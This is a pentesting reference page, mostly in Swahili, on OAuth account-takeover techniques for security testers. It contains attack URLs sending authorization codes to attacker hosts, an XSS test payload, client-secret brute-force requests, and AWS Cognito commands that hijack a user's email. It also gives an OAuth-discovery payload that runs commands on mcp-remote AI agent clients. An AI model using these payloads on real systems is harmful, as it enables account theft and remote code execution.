# OAuth hadi Kunyakua Akaunti

{{#include ../banners/hacktricks-training.md}}

## Maelezo ya Msingi <a href="#d4a8" id="d4a8"></a>

OAuth inatoa matoleo mbalimbali, na maarifa ya msingi yanapatikana kwenye [OAuth 2.0 documentation](https://oauth.net/2/). Mazungumzo haya yanazingatia hasa [OAuth 2.0 authorization code grant type](https://oauth.net/2/grant-types/authorization-code/), yanayotoa **mfumo wa idhini unaowezesha programu kufikia au kufanya vitendo kwenye akaunti ya mtumiaji katika programu nyingine** (the authorization server).

Fikiria tovuti ya mfano _**https://example.com**_, iliyotengenezwa ili **kuonyesha machapisho yako yote ya mitandao ya kijamii**, ikiwa ni pamoja na yaliyofichwa. Ili kufanikisha hili, OAuth 2.0 inatumika. _https://example.com_ itaomba ruhusa yako ya **kupata machapisho yako ya mitandao ya kijamii**. Kwa hiyo, skrini ya idhini itaonekana kwenye _https://socialmedia.com_, ikielezea **idhini zinazoombwa na msanidi programu anayetoa ombi**. Baada ya wewe kutoa idhini, _https://example.com_ itapata uwezo wa **kupata machapisho yako kwa niaba yako**.

Ni muhimu kuelewa vipengele vifuatavyo ndani ya muundo wa OAuth 2.0:

- **resource owner**: Wewe, kama **mtumiaji/entiti**, unatoa ruhusa ya ufikiaji wa rasilimali yako, kama machapisho ya akaunti yako ya mitandao ya kijamii.
- **resource server**: Seva inayosimamia maombi yaliyoidhinishwa baada ya programu kupata `access token` kwa niaba ya `resource owner`, mfano, **https://socialmedia.com**.
- **client application**: Programu inayotafuta idhini kutoka kwa `resource owner`, kama **https://example.com**.
- **authorization server**: Seva inayotoa `access tokens` kwa `client application` baada ya `resource owner` kuthibitishwa na kupata idhini, kwa mfano, **https://socialmedia.com**.
- **client_id**: Kitambulisho cha umma, kisicho na kurudiwa kwa ajili ya programu.
- **client_secret:** Ufunguo wa siri, unaojulikana kwa programu pekee na authorization server, unaotumika kuzalisha `access_tokens`.
- **response_type**: Thamani inayoelezea **aina ya token inayotakiwa**, kama `code`.
- **scope**: Ngazi ya ufikiaji ambayo `client application` inaomba kutoka kwa `resource owner`.
- **redirect_uri**: URL ambayo mtumiaji anarudishwa baada ya idhini. Hii kwa kawaida lazima ifanane na URL ya redirect iliyosajiliwa awali.
- **state**: Parameteri ya **kuhifadhi data wakati wa kurudishwa kwa mtumiaji kwenda na kutoka kwa authorization server**. Uwe wa kipekee ni muhimu kwa kutumika kama **mfumo wa ulinzi dhidi ya CSRF**.
- **grant_type**: Parameteri inayoonyesha **aina ya grant na aina ya token itakayorejeshwa**.
- **code**: Kanuni ya idhini kutoka kwa `authorization server`, inayotumika pamoja na `client_id` na `client_secret` na `client application` kupata `access_token`.
- **access_token**: Token ambayo `client application` inatumia kwa maombi ya API kwa niaba ya `resource owner`.
- **refresh_token**: Inamruhusu programu **kupata `access_token` mpya bila kuomba tena ruhusa ya mtumiaji**.

### Mtiririko

**mtiririko halisi wa OAuth** unaendelea kama ifuatavyo:

1. Unaenda kwenye [https://example.com](https://example.com) na kuchagua kitufe “Integrate with Social Media”.
2. Tovuti kisha inatuma ombi kwa [https://socialmedia.com](https://socialmedia.com) ikikuomba ruhusa yako ili kuruhusu application ya https://example.com kufikia machapisho yako. Ombi limeundwa kama ifuatavyo:
```
https://socialmedia.com/auth
?response_type=code
&client_id=example_clientId
&redirect_uri=https%3A%2F%2Fexample.com%2Fcallback
&scope=readPosts
&state=randomString123
```
3. Kisha utaonyeshwa ukurasa wa idhini.
4. Baada ya idhini yako, Social Media inatuma jibu kwa `redirect_uri` yenye vigezo `code` na `state`:
```
https://example.com?code=uniqueCode123&state=randomString123
```
5. https://example.com inatumia `code` hii, pamoja na `client_id` na `client_secret` yake, kutuma server-side request ili kupata `access_token` kwa niaba yako, ikiruhusu upatikanaji wa ruhusa ulizokubali:
```
POST /oauth/access_token
Host: socialmedia.com
...{"client_id": "example_clientId", "client_secret": "example_clientSecret", "code": "uniqueCode123", "grant_type": "authorization_code"}
```
6. Mwishowe, mchakato unaisha wakati https://example.com inatumia `access_token` yako kufanya API call kwa Social Media ili kupata

## Udhaifu <a href="#id-323a" id="id-323a"></a>

### Open redirect_uri <a href="#cc36" id="cc36"></a>

Kulingana na [RFC 6749 §3.1.2](https://www.rfc-editor.org/rfc/rfc6749#section-3.1.2), authorization server inapaswa kurejesha browser tu kwa **pre-registered, exact redirect URIs**. Udhaifu wowote hapa unamwezesha mshambuliaji kumtuma mhanga kupitia malicious authorization URL ili IdP impe `code` (na `state`) ya mhanga moja kwa moja kwa endpoint ya mshambuliaji, ambaye anaweza kuiredeem na kuvuna tokens.

Mchakato wa kawaida wa shambulio:

1. Tengeneza `https://idp.example/auth?...&redirect_uri=https://attacker.tld/callback` na uitume kwa mhanga.
2. Mhanga anafanya authentication na kuidhinisha scopes.
3. IdP inarejesha kwa `attacker.tld/callback?code=<victim-code>&state=...` ambapo mshambuliaji anarekodi request na mara moja anabadilisha `code`.

Hitilafu za kawaida za validation za kuchunguza:

- **Hakuna uthibitisho** – any absolute URL is accepted, ikisababisha wizi wa `code` mara moja.
- **Weak substring/regex checks on the host** – pasha bypass kwa lookalikes kama `evilmatch.com`, `match.com.evil.com`, `match.com.mx`, `matchAmatch.com`, `evil.com#match.com`, au `match.com@evil.com`.
- **IDN homograph mismatches** – validation inatokea kwenye fomu ya punycode (`xn--`), lakini browser inarejesha kwa domain ya Unicode inayodhibitiwa na mshambuliaji.
- **Arbitrary paths on an allowed host** – kuonyesha `redirect_uri` kwa `/openredirect?next=https://attacker.tld` au endpoint yoyote ya XSS/user-content hutoka `code` kupitia chained redirects, Referer headers, au JavaScript iliyochomwa.
- **Directory constraints without normalization** – mifumo kama `/oauth/*` inaweza kupitishwa na `/oauth/../anything`.
- **Wildcard subdomains** – kukubali `*.example.com` inamaanisha takeover yoyote (dangling DNS, S3 bucket, n.k.) mara moja hutoa callback halali.
- **Non-HTTPS callbacks** – kuruhusu `http://` URIs kunawapa washambuliaji wa mtandao (Wi-Fi, corporate proxy) fursa ya kukamata `code` safarini.

Pitia pia vigezo vingine vya mtindo wa redirect (`client_uri`, `policy_uri`, `tos_uri`, `initiate_login_uri`, n.k.) na OpenID discovery document (`/.well-known/openid-configuration`) kwa endpoints za ziada ambazo zinaweza kurithi hitilafu za validation sawa.

### XSS in redirect implementation <a href="#bda5" id="bda5"></a>

Kama ilivyotajwa katika ripoti hii ya bug bounty [https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html](https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html) inaweza kuwa inawezekana kwamba redirect **URL is being reflected in the response** ya server baada ya mtumiaji ku-authenticate, ikiwa **vulnerable to XSS**. Payload inayowezekana ya kujaribu:
```
https://app.victim.com/login?redirectUrl=https://app.victim.com/dashboard</script><h1>test</h1>
```
### CSRF - Uendeshaji usio sahihi wa parameter ya `state` <a href="#bda5" id="bda5"></a>

The `state` parameter is the Authorization Code flow CSRF token: the client must generate a **thamani ya kihalisi kwa njia ya kriptografia kwa kila mfano wa kivinjari**, persist it somewhere only that browser can read (cookie, local storage, etc.), send it in the authorization request, and reject any response that does not return the same value. Whenever the value is static, predictable, optional, or not tied to the user’s session, the attacker can finish their own OAuth flow, capture the final `?code=` request (without sending it), and later coerce a victim browser into replaying that request so the victim account becomes linked to the attacker’s identity provider profile.

Mfano wa kurudia ni daima ule ule:

1. The attacker authenticates against the IdP with their account and intercepts the last redirect containing `code` (and any `state`).
2. They drop that request, keep the URL, and later abuse any CSRF primitive (link, iframe, auto-submitting form) to force the victim browser to load it.
3. If the client does not enforce `state`, the application consumes the attacker’s authorization result and logs the attacker into the victim’s app account.

A practical checklist for `state` handling during tests:

- **Missing `state` entirely** – if the parameter never appears, the whole login is CSRFable.
- **`state` not required** – remove it from the initial request; if the IdP still issues codes that the client accepts, the defense is opt-in.
- **Returned `state` not validated** – tamper with the value in the response (Burp, MITM proxy). Accepting mismatched values means the stored token is never compared.
- **Predictable or purely data-driven `state`** – many apps stuff redirect paths or JSON blobs into `state` without mixing in randomness, letting attackers guess valid values and replay flows. Daima ongeza entropy madhubuti (prepend/append) kabla ya ku-encode data.
- **`state` fixation** – if the app lets users supply the `state` value (e.g., via crafted authorization URLs) and reuses it throughout the flow, an attacker can lock in a known value and reuse it across victims.

PKCE can complement `state` (especially for public clients) by binding the authorization code to a code verifier, but web clients must still track `state` to prevent cross-user CSRF/account-linking bugs.

### Kabla ya Account Takeover <a href="#ebe4" id="ebe4"></a>

1. **Without Email Verification on Account Creation**: Washambuliaji wanaweza kuunda akaunti mapema kwa kutumia barua pepe ya mwathiriwa. Ikiwa mwathiriwa baadaye atatumia huduma ya third-party kwa login, application inaweza bila kutakaswa kuunganisha akaunti ya third-party hii na akaunti iliyoundwa mapema na mshambuliaji, na kusababisha upatikanaji usioidhinishwa.
2. **Exploiting Lax OAuth Email Verification**: Washambuliaji wanaweza kutumia huduma za OAuth ambazo hazithibitishi barua pepe kwa kujisajili kwenye huduma yao kisha kubadilisha barua pepe ya akaunti kuwa ya mwathiriwa. Njia hii pia ina hatari ya upatikanaji usioidhinishwa wa akaunti, kama katika tukio la kwanza lakini kupitia vector tofauti ya shambulizi.

### Disclosure of Secrets <a href="#e177" id="e177"></a>

The `client_id` is intentionally public, but the **`client_secret` must never be recoverable by end users**. Authorization Code deployments that embed the secret in **mobile APKs, desktop clients, or single-page apps** effectively hand that credential to anyone who can download the package. Always inspect public clients by:

- Unpacking the APK/IPA, desktop installer, or Electron app and grepping for `client_secret`, Base64 blobs that decode to JSON, or hard-coded OAuth endpoints.
- Reviewing bundled config files (plist, JSON, XML) or decompiled strings for client credentials.

Once the attacker extracts the secret they only need to steal any victim authorization `code` (via a weak `redirect_uri`, logs, etc.) to independently hit `/token` and mint access/refresh tokens without involving the legitimate app. Treat public/native clients as **incapable of holding secrets**—they should instead rely on PKCE (RFC 7636) to prove possession of a per-instance code verifier instead of a static secret. During testing, confirm whether PKCE is mandatory and whether the backend actually rejects token exchanges that omit either the `client_secret` **or** a valid `code_verifier`.

### Client Secret Bruteforce

You can try to **bruteforce `client_secret`** of a service provider with the identity provider in order to be try to steal accounts.\
The request to BF may look similar to:
```
POST /token HTTP/1.1
content-type: application/x-www-form-urlencoded
host: 10.10.10.10:3000
content-length: 135
Connection: close

code=77515&redirect_uri=http%3A%2F%2F10.10.10.10%3A3000%2Fcallback&grant_type=authorization_code&client_id=public_client_id&client_secret=[bruteforce]
```
### Referer/Header/Location artifacts leaking Code + State

Once the client has the **code and state**, if they surface in **`location.href`** or **`document.referrer`** and are forwarded to third parties, they leak. Two recurring patterns:

- **Classic Referer leak**: after the OAuth redirect, any navigation that keeps `?code=&state=` in the URL will push them into the **Referer** header sent to CDNs/analytics/ads.
- **Telemetry/analytics confused deputy**: some SDKs (pixels/JS loggers) react to `postMessage` events and then **send the current `location.href`/`referrer` to backend APIs using a token supplied in the message**. If you can inject your own token into that flow (e.g., via an attacker-controlled postMessage relay), you can later read the SDK’s API request history/logs and recover the victim’s OAuth artifacts embedded in those requests.


### Access Token Stored in Browser History

The core guarantee of the Authorization Code grant is that **access tokens never reach the resource owner’s browser**. When implementations leak tokens client-side, any minor bug (XSS, Referer leak, proxy logging) becomes instant account compromise. Always check for:

- **Tokens in URLs** – if `access_token` appears in the query/fragment, it lands in browser history, server logs, analytics, and Referer headers sent to third parties.
- **Tokens transiting untrusted middleboxes** – returning tokens over HTTP or through debugging/corporate proxies lets network observers capture them directly.
- **Tokens stored in JavaScript state** – React/Vue stores, global variables, or serialized JSON blobs expose tokens to every script on the origin (including XSS payloads or malicious extensions).
- **Tokens persisted in Web Storage** – `localStorage`/`sessionStorage` retain tokens long after logout on shared devices and are script-accessible.

Any of these findings usually upgrades otherwise “low” bugs (like a CSP bypass or DOM XSS) into full API takeover because the attacker can simply read and replay the leaked bearer token.

### Everlasting Authorization Code

Authorization codes must be **short-lived, single-use, and replay-aware**. When assessing a flow, capture a `code` and:

- **Test the lifetime** – RFC 6749 recommends minutes, not hours. Try redeeming the code after 5–10 minutes; if it still works, the exposure window for any leaked code is excessive.
- **Test sequential reuse** – send the same `code` twice. If the second request yields another token, attackers can clone sessions indefinitely.
- **Test concurrent redemption/race conditions** – fire two token requests in parallel (Burp intruder, turbo intruder). Weak issuers sometimes grant both.
- **Observe replay handling** – a reuse attempt should not only fail but also revoke any tokens already minted from that code. Otherwise, a detected replay leaves the attacker’s first token active.

Combining a replay-friendly code with any `redirect_uri` or logging bug allows persistent account access even after the victim completes the legitimate login.

### Authorization/Refresh Token not bound to client

If you can get the **authorization code** and **redeem it for a different client/app**, you can takeover other accounts. Test for weak binding by:

- Capturing a `code` for **app A** and sending it to **app B’s token endpoint**; if you still receive a token, audience binding is broken.
- Trying first-party token minting endpoints that should be restricted to their own client IDs; if they accept arbitrary `state`/`app_id` while only validating the code, you effectively perform an **authorization-code swap** to mint higher-privileged first-party tokens.
- Checking whether client binding ignores nonce/redirect URI mismatches. If an error page still loads SDKs that log `location.href`, combine with Referer/telemetry leaks to steal codes and redeem them elsewhere.

Any endpoint that exchanges `code` → token **must** verify the issuing client, redirect URI, and nonce; otherwise, a stolen code from any app can be upgraded to a first-party access token.

### Happy Paths, XSS, Iframes & Post Messages to leak code & state values

[**Check this post**](https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/#gadget-2-xss-on-sandbox-third-party-domain-that-gets-the-url)

### AWS Cognito <a href="#bda5" id="bda5"></a>

In this bug bounty report: [**https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/**](https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/) you can see that the **token** that **AWS Cognito** gives back to the user might have **enough permissions to overwrite the user data**. Therefore, if you can **change the user email for a different user email**, you might be able to **take over** others accounts.
```bash
# Read info of the user
aws cognito-idp get-user --region us-east-1 --access-token eyJraWQiOiJPVj[...]

# Change email address
aws cognito-idp update-user-attributes --region us-east-1 --access-token eyJraWQ[...] --user-attributes Name=email,Value=imaginary@flickr.com
{
"CodeDeliveryDetailsList": [
{
"Destination": "i***@f***.com",
"DeliveryMedium": "EMAIL",
"AttributeName": "email"
}
]
}
```
Kwa maelezo zaidi kuhusu jinsi ya kutumia vibaya AWS Cognito angalia [AWS Cognito - Unauthenticated Enum Access](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-unauthenticated-enum-access/aws-cognito-unauthenticated-enum.html).

### Kutumia vibaya other Apps tokens <a href="#bda5" id="bda5"></a>

Kama [**mentioned in this writeup**](https://salt.security/blog/oh-auth-abusing-oauth-to-take-over-millions-of-accounts), OAuth flows ambazo zinatarajia kupokea **token** (na si code) zinaweza kuwa hatarini endapo hazikagui kuwa token inamilikiwa na app.

Hii ni kwa sababu **attacker** anaweza kuunda **application supporting OAuth and login with Facebook** (kwa mfano) kwenye application yake mwenyewe. Kisha, mara **victim** anapoingia kwa Facebook kwenye **attackers application**, attacker anaweza kupata **OAuth token ya mtumiaji iliyotolewa kwa application yake, na kuitumia kuingia katika victim OAuth application kwa kutumia token ya mtumiaji wa victim**.

> [!CAUTION]
> Kwa hivyo, ikiwa attacker atafanikiwa kumfanya user aingie kwenye OAuth application yake mwenyewe, ataweza kuchukua over account ya victim katika applications ambazo zinatarajia token na hazikagui kama token ilitolewa kwa app ID yao.

### Two links & cookie <a href="#bda5" id="bda5"></a>

Kulingana na [**this writeup**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), ilikuwa inawezekana kumfanya victim afungue ukurasa wenye **returnUrl** unaoelekeza kwenye host ya attacker. Taarifa hii ingehifadhiwa katika cookie (RU) na katika **hatua ya baadaye** **prompt** itauliza **user** kama anataka kutoa access kwa host ya attacker.

Ili kuzipita prompt hizi, ilikuwa inawezekana kufungua tab kuanzisha **Oauth flow** ambayo ingeweka cookie ya RU kwa kutumia **returnUrl**, kufunga tab kabla ya prompt kuonekana, na kisha kufungua tab mpya bila thamani hiyo. Kisha, **prompt** haitamjulisha kuhusu host ya attacker, lakini cookie itakuwa imewekwa kwake, hivyo **token** itatumwa kwa host ya attacker katika redirection.

### Prompt Interaction Bypass <a href="#bda5" id="bda5"></a>

Kama ilivyoelezwa katika [**this video**](https://www.youtube.com/watch?v=n9x7_J_a_7Q), baadhi ya implementations za OAuth zinaruhusu kuonyesha parameter ya GET ya **`prompt`** kama None (**`&prompt=none`**) ili **kuzuia users kuulizwa kuthibitisha** access iliyotolewa kwenye prompt kwenye web ikiwa tayari wameingia kwenye platform.

### response_mode

Kama [**explained in this video**](https://www.youtube.com/watch?v=n9x7_J_a_7Q), inaweza kuwa inawezekana kuonyesha parameter **`response_mode`** kuonyesha wapi unataka code itolewe kwenye URL ya mwisho:

- `response_mode=query` -> The code is provided inside a GET parameter: `?code=2397rf3gu93f`
- `response_mode=fragment` -> The code is provided inside the URL fragment parameter `#code=2397rf3gu93f`
- `response_mode=form_post` -> The code is provided inside a POST form with an input called `code` and the value
- `response_mode=web_message` -> The code is send in a post message: `window.opener.postMessage({"code": "asdasdasd...`

### Clickjacking OAuth consent dialogs

OAuth consent/login dialogs ni malengo mazuri ya clickjacking: ikiwa zinaweza kuframishwa, attacker anaweza kuweka overlay ya graphics za juu, kuficha vitufe halisi, na kumdanganya user kuidhinisha scopes hatari au kuunganisha accounts. Tengeneza PoCs ambazo:

1. Load the IdP authorization URL inside an `<iframe sandbox="allow-forms allow-scripts allow-same-origin">`.
2. Tumia positioning/opacity tricks kurekebisha fake buttons ili zilingane na controls zilizofichwa za **Allow**/**Approve**.
3. Hiari pre-fill parameters (scopes, redirect URI) ili approval iliyopigwa iwe faida kwa attacker mara moja.

Wakati wa testing hakikisha kuwa kurasa za IdP zinatoa ama `X-Frame-Options: DENY/SAMEORIGIN` au restrictive `Content-Security-Policy: frame-ancestors 'none'`. Ikiwa neither ipo,onyesha hatari kwa kutumia tooling kama [NCC Group’s clickjacking PoC generator](https://github.com/nccgroup/clickjacking-poc) na rekodi jinsi victim anavyoweza kuidhinisha app ya attacker kwa urahisi. Kwa wazo za payload za ziada angalia [Clickjacking](clickjacking.md).

### OAuth ROPC flow - 2 FA bypass <a href="#b440" id="b440"></a>

Kulingana na [**this blog post**](https://cybxis.medium.com/a-bypass-on-gitlabs-login-email-verification-via-oauth-ropc-flow-e194242cad96), hii ni OAuth flow inayoruhusu kuingia kwa OAuth kupitia **username** na **password**. Ikiwa katika flow hii rahisi token inayoruhusu access kwa vitendo vyote mtumiaji anaweza kufanya inarudishwa basi inawezekana kupita 2FA kwa kutumia token hiyo.

### ATO on web page redirecting based on open redirect to referrer <a href="#bda5" id="bda5"></a>

Hii [**blogpost**](https://blog.voorivex.team/oauth-non-happy-path-to-ato) inaeleza jinsi ilivyokuwa inawezekana kutumia **open redirect** kwa value ya **referrer** kuiba OAuth na kusababisha ATO. Shambulio lilikuwa:

1. Victim anaenda kwenye ukurasa wa attacker
2. Victim anafungua link hatari na opener inaanzisha Google OAuth flow na `response_type=id_token,code&prompt=none` kama parameters za ziada kwa kutumia kama **referrer tovuti ya attacker**.
3. Katika opener, baada provider kuruhusu victim, inamrudisha nyuma kwa value ya `redirect_uri` parameter (tovuti ya victim) na 30X code ambayo bado inaweka tovuti ya attacker katika referer.
4. Tovuti ya victim **inasababisha open redirect based on the referrer** ikimletea user kwa tovuti ya attacker; kwa kuwa **`respose_type`** ilikuwa **`id_token,code`**, code itatumwa kwa attacker katika **fragment** ya URL na kumruhusu kuchukua over account ya user kupitia Google kwenye tovuti ya victim.

### SSRFs parameters <a href="#bda5" id="bda5"></a>

[**Check this research**](https://portswigger.net/research/hidden-oauth-attack-vectors) **For further details of this technique.**

Dynamic Client Registration katika OAuth ni vector isiyo ya wazi lakini muhimu kwa vulnerabilities za usalama, hasa kwa **Server-Side Request Forgery (SSRF)** attacks. Endpoint hii inaruhusu OAuth servers kupokea maelezo kuhusu client applications, ikijumuisha URLs nyeti ambazo zinaweza kutumika vibaya.

Mambo Muhimu:

- **Dynamic Client Registration** mara nyingi inamepangwa kwa `/register` na inakubali maelezo kama `client_name`, `client_secret`, `redirect_uris`, na URLs kwa logos au JSON Web Key Sets (JWKs) kupitia POST requests.
- Kipengele hiki kinafuata specs zilizowekwa katika **RFC7591** na **OpenID Connect Registration 1.0**, ambazo zinajumuisha parameters zinazoweza kuwa hatarini kwa SSRF.
- Mchakato wa registration unaweza kwa bahati mbaya kumfuta servers kwa SSRF kwa njia kadhaa:
  - **`logo_uri`**: URL ya logo ya client application ambayo server inaweza kuiga, ikasababisha SSRF au XSS ikiwa URL itashughulikiwa vibaya.
  - **`jwks_uri`**: URL ya JWK document ya client, ambayo ikiwa imeundwa kwa malice, inaweza kusababisha server kutuma requests za outbound kwa server inayodhibitiwa na attacker.
  - **`sector_identifier_uri`**: Inareferencia array ya JSON ya `redirect_uris`, ambayo server inaweza kuiga, ikizalisha nafasi ya SSRF.
  - **`request_uris`**: Inataja request URIs zinazoruhusiwa kwa client, ambazo zinaweza kutumika ikiwa server inazifuata mwanzoni mwa authorization process.

Exploitation Strategy:

- SSRF inaweza kuanzishwa kwa kuregister client mpya yenye malicious URLs katika parameters kama `logo_uri`, `jwks_uri`, au `sector_identifier_uri`.
- Ingawa exploitation ya moja kwa moja kupitia `request_uris` inaweza kupunguzwa kwa controls za whitelist, kutoa `request_uri` iliyorejisted kabla na kudhibitiwa na attacker kunaweza kuwezesha SSRF wakati wa authorization phase.

### OAuth/OIDC Discovery URL Abuse & OS Command Execution

Utafiti kuhusu [CVE-2025-6514](https://amlalabs.com/blog/oauth-cve-2025-6514/) (inakera `mcp-remote` clients kama Claude Desktop, Cursor or Windsurf) unaonyesha jinsi **dynamic OAuth discovery inavyokuwa RCE primitive** kila wakati mteja anapopeleka IdP metadata moja kwa moja kwa operating system. MCP server ya mbali inarudisha `authorization_endpoint` inayodhibitiwa na attacker wakati wa discovery exchange (`/.well-known/openid-configuration` au metadata RPC yoyote). `mcp-remote ≤0.1.15` kisha ingepiga system URL handler (`start`, `open`, `xdg-open`, etc.) na mfuatano wowote uliokuja, hivyo scheme/path yoyote inayoungwa mkono na OS ilitekelezwa kwa ndani.

Workflow ya Attack

1. Elekeza desktop agent kwa MCP/OAuth server hatari (`npx mcp-remote https://evil`). Agent inapokea `401` pamoja na metadata.
2. Server inajibu kwa JSON kama:
```
HTTP/1.1 200 OK
Content-Type: application/json

{
"authorization_endpoint": "file:/c:/windows/system32/calc.exe",
"token_endpoint": "https://evil/idp/token",
...
}
```
3. The client inaendesha OS handler kwa URI iliyotolewa. Windows inakubali payloads kama `file:/c:/windows/system32/calc.exe /c"powershell -enc ..."`; macOS/Linux zinakubali `file:///Applications/Calculator.app/...` au hata custom schemes kama `cmd://bash -lc '<payload>'` ikiwa zimesajiliwa.
4. Kwa sababu hili hufanyika kabla ya mwingiliano wowote wa mtumiaji, **merely configuring the client to talk to the attacker server yields code execution**.

**Jinsi ya kujaribu**

- Lenga desktop/agent yoyote yenye uwezo wa OAuth inayofanya discovery kupitia HTTP(S) na kufungua endpoints zilizorejeshwa kwa ndani (Electron apps, CLI helpers, thick clients).
- Intercept au host response ya discovery na badilisha `authorization_endpoint`, `device_authorization_endpoint`, au fields zinazofanana na `file://`, `cmd://`, UNC paths, au schemes hatari nyingine.
- Angalia kama client inathibitisha scheme/host. Kukosa uthibitisho kunasababisha immediate execution chini ya user context na kuthibitisha tatizo.
- Rudia kwa schemes tofauti ili kubaini attack surface yote (kwa mfano, `ms-excel:`, `data:text/html,`, custom protocol handlers) na kuonyesha cross-platform reach.

## OAuth providers Race Conditions

Kama jukwaa unalofanyia mtihani ni OAuth provider [**read this to test for possible Race Conditions**](race-condition.md).

## Mutable Claims Attack

In OAuth, uwanja sub unatambulisha mtumiaji kwa njia ya kipekee, lakini muundo wake unabadilika kulingana na Authorization Server. Ili kuweka utambulisho wa watumiaji sawa, baadhi ya clients hutumia emails au user handles. Hata hivyo, hili ni hatari kwa sababu:

- Baadhi ya Authorization Servers hazihakikishi kwamba mali hizi (kama email) zitabaki immutable.
- Katika utekelezaji fulani—kama **"Login with Microsoft"**—client inategemea uwanja wa email, ambao ni **user-controlled by the user in Entra ID** na hauhakikishwi.
- An attacker anaweza kutumia hili kwa kuunda Azure AD organization yao wenyewe (mfano, doyensectestorg) na kuitumia kufanya Microsoft login.
- Ingawa Object ID (iliyohifadhiwa katika sub) ni immutable na salama, kutegemea uwanja wa email unaoweza kubadilika kunaweza kuwezesha account takeover (kwa mfano, hijacking akaunti kama victim@gmail.com).

## Client Confusion Attack

Katika **Client Confusion Attack**, application inayotumia OAuth Implicit Flow hairifiathi kuthibitisha kwamba final access token imetengenezwa mahsusi kwa Client ID yake. An attacker anaunda tovuti ya umma inayotumia Google’s OAuth Implicit Flow, akidanganya maelfu ya watumiaji kuingia na hivyo kuvuna access tokens zilizokusudiwa kwa tovuti ya attacker. Ikiwa watumiaji hawa pia wanaakaunti kwenye tovuti nyingine iliyo vulnerable ambayo haitathibitishi Client ID ya token, attacker anaweza kutumia tena tokens zilizovunwa kuiga waathiriwa na kuchukua udhibiti wa akaunti zao.

## Scope Upgrade Attack

Aina ya **Authorization Code Grant** inahusisha mawasiliano salama server-to-server kwa usafirishaji wa data za watumiaji. Hata hivyo, kama **Authorization Server** inamtumaini kwa kimya kimya parameter ya scope katika Access Token Request (parameter ambayo haijaelezwa kwenye RFC), programu yenye nia mbaya inaweza kuinua vigezo vya ruhusa vya authorization code kwa kuomba scope kubwa zaidi. Baada **Access Token** inapotengenezwa, **Resource Server** lazima iithibitishe: kwa JWT tokens, hili linajumuisha kuangalia saini ya JWT na kutoa data kama client_id na scope, wakati kwa tokens za string nasibu, server lazima iulize Authorization Server ili kupata maelezo ya token.

## Redirect Scheme Hijacking

Katika utekelezaji wa OAuth kwenye mobile, apps hutumia **custom URI schemes** kupokea redirects zenye Authorization Codes. Hata hivyo, kwa sababu apps nyingi zinaweza kusajili scheme ile ile kwenye kifaa, dhana kwamba client halali pekee ndiye anayesimamia redirect URI huvunjwa. Kwenye Android, kwa mfano, Intent URI kama `com.example.app://` oauth inakamatwa kwa kuzingatia scheme na optional filters zilizofafanuliwa katika intent-filter ya app. Kwa kuwa Android’s intent resolution inaweza kuwa pana—hasa ikiwa scheme pekee imeainishwa—an attacker anaweza kusajili app hatari yenye intent filter iliyoundwa kwa uangalifu ili hijack authorization code. Hii inaweza **enable an account takeover** ama kupitia user interaction (wakati apps nyingi zinafaa kushughulikia intent) au kupitia mbinu za bypass zinazotumia vichujio vilivyo maalum kupita kiasi, kama ilivyoelezwa kwenye flowchart ya tathmini ya Ostorlab.

## References

- [**https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1**](https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1)
- [**https://portswigger.net/research/hidden-oauth-attack-vectors**](https://portswigger.net/research/hidden-oauth-attack-vectors)
- [**https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html**](https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html)
- [An Offensive Guide to the OAuth 2.0 Authorization Code Grant](https://www.nccgroup.com/research-blog/an-offensive-guide-to-the-authorization-code-grant/)
- [OAuth Discovery as an RCE Vector (Amla Labs)](https://amlalabs.com/blog/oauth-cve-2025-6514/)
- [Leaking fbevents: OAuth code exfiltration via postMessage trust leading to Instagram ATO](https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html)

{{#include ../banners/hacktricks-training.md}}
